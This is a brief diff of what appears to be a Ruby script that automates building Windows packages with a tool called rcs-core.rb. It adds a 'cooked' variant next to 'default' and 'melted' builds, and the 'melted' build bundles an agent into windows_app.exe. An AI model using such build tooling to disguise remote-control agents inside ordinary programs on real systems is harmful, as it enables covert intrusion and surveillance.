@@ -89,6 +89,8 @@ params = {platform: 'windows',
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o windows_default.zip" or raise("Failed")
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -i windows_app.exe -o windows_melted.zip" or raise("Failed")
+params[:melt][:cooked] = true
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o windows_cooked.zip" or raise("Failed")
 end
 ###################################################################################################
 puts "End"
